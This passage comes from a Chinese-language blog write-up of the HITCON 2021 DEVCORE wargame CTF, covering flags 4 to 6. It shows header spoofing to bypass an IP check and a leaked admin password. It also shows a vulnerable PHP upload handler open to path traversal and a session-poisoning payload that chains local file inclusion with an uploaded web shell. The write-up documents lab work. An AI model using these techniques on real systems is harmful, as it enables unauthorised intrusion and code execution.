+</span></span></code></pre></div><p>但可以發現驗證 IP 來源是參考 HTTP header 的內容，只要在 header 中加入 <code>CLIENT-IP</code>、<code>X-FORWARDED-FOR</code>、<code>REMOTE-ADDR</code> 即可繞過其限制。詳細可以參考 <a href=https://devco.re/blog/2014/06/19/client-ip-detection/>如何正確的取得使用者 IP？ | DEVCORE 戴夫寇爾</a></p><p><img alt=client_ip loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/client_ip.png></p><p>並且可以使用剛剛 SQL injection 取得的帳號密碼 <code>admin/u=479_p5jV:Fsq(2</code> 進行登入。</p><p>登入後即可取得第四個 flag。</p><p><img alt=flag_4 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/flag_4.png></p><h2 id=flag-5>Flag 5<a hidden class=anchor aria-hidden=true href=#flag-5>#</a></h2><p>在上傳的功能中可以發現如果在 POST 封包中，若有參數 <code>rename</code> 、 <code>folder</code> 即可控制上傳檔案的檔案名稱以及路徑，並且未有任何限制。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;include.php&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_SERVER[<span style=color:#e6db74>&#39;REQUEST_METHOD&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;GET&#39;</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: text/plain&#39;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>();
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>is_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>])) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: application/json; charset=utf-8&#39;</span>);
+</span></span><span style=display:flex><span>    $ext <span style=color:#f92672>=</span> <span style=color:#a6e22e>pathinfo</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;name&#39;</span>], <span style=color:#a6e22e>PATHINFO_EXTENSION</span>);
+</span></span><span style=display:flex><span>    $filename <span style=color:#f92672>=</span> <span style=color:#a6e22e>random_str</span>(<span style=color:#ae81ff>32</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>.</span>$ext;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;rename&#39;</span>])) {
+</span></span><span style=display:flex><span>        $filename <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;rename&#39;</span>];
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;folder&#39;</span>])) {
+</span></span><span style=display:flex><span>        $folder <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;folder&#39;</span>];
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>file_exists</span>(<span style=color:#a6e22e>IMAGE_PATH</span><span style=color:#f92672>.</span>$folder)) {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>mkdir</span>(<span style=color:#a6e22e>IMAGE_PATH</span><span style=color:#f92672>.</span>$folder);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        $filename <span style=color:#f92672>=</span> $folder<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span>$filename;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    $filepath <span style=color:#f92672>=</span> <span style=color:#a6e22e>IMAGE_PATH</span> <span style=color:#f92672>.</span> $filename;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>move_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>], $filepath);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;rsync_wrap &#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>escapeshellarg</span>($filepath));
+</span></span><span style=display:flex><span>    $id <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_urlsafe_encode</span>($filename);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>json_encode</span>([
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;default&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;/image.php?id=&#39;</span><span style=color:#f92672>.</span>$id
+</span></span><span style=display:flex><span>    ]);
+</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>http_response_code</span>(<span style=color:#ae81ff>400</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>只要在 <code>folder</code> 中含有 <code>/../</code> 即可出現第五個 flag。</p><p><img alt=flag_5 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/flag_5.png></p><h2 id=flag-6>Flag 6<a hidden class=anchor aria-hidden=true href=#flag-6>#</a></h2><p>最後一個 flag 要想辦法上傳 shell，但因 nginx 可以瀏覽的路徑都是 mount 成 ro 無法直接上傳 web shell。</p><pre tabindex=0><code># /proc/mounts
+/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+</code></pre><p>可以在 <code>/usr/share/nginx/frontend/include.php</code> 裡面發現一段語系切換的功能。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># frontend/include.php
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;lang&#39;</span>])) {
+</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;lang&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>DEFAULT_LANGUAGE</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;langs/&#39;</span> <span style=color:#f92672>.</span> $_SESSION[<span style=color:#e6db74>&#39;lang&#39;</span>] <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;.php&#39;</span>);
+</span></span></code></pre></div><p>這裡會將 session 中的 <code>lang</code> 值當成語系檔案引入進來，且並未做任何驗證，只要在 <code>lang</code> 中填入任意路徑即可達成 local file inclusion 弱點，執行 web shell。</p><p>先在 <code>/usr/share/nginx/images/</code> 中上傳我們要被引入的 web shell。</p><p><img alt=web_shell loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/web_shell.png></p><p>PHP 的 session 值會存在於 <code>/tmp/sess_&lt;session_id></code>。
+所以只要上傳 <code>lang|s:18:"../../images/shell";</code> 至 <code>/tmp/sess_&lt;session_id></code>，就可以將 session 中的 <code>lang</code> 值更改成 <code>../../images/shell</code>，進而執行 web shell。</p><p><img alt=sess loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sess.png></p><p><img alt=get_shell loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/get_shell.png></p><p>根目錄裡有一個 <code>/readflag</code> 執行後即可得到第六個 flag。</p><p><img alt=readflag loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/readflag.png></p><p><img alt=flag_6 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/flag_6.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/security/>Security</a></li><li><a href=http://localhost:1313/tags/writeup/>Writeup</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>Gary Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
